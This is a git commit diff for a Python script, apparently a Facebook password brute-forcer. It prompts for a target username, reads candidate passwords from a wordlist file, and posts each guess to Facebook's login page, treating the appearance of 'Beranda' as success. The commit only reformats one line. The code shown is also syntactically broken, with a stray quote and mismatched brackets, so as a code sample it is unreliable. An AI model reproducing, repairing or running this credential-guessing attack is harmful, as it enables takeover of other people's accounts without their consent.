1dc61e979f15993c20ff914463d47ff74f8e453d
Wekai <47638706+Wekai@users.noreply.github.com>
2019-03-23 13:33:21 +0700

    Update Main.py

--- Main.py
+++ Main.py
@@ -17,7 +17,7 @@ email = raw_input(" Masukan Username Target :")
 url='https://free.facebook.com/login.php'
 ex = open('word.txt','r').readlines()
 for line in ex:
-password=line.strip()"
+password = line.strip()"
 http = requests.post(url, data=('email':email, 'pass':password, 'login':'sumbit'})
 content = http.content
 if "Beranda" in content:
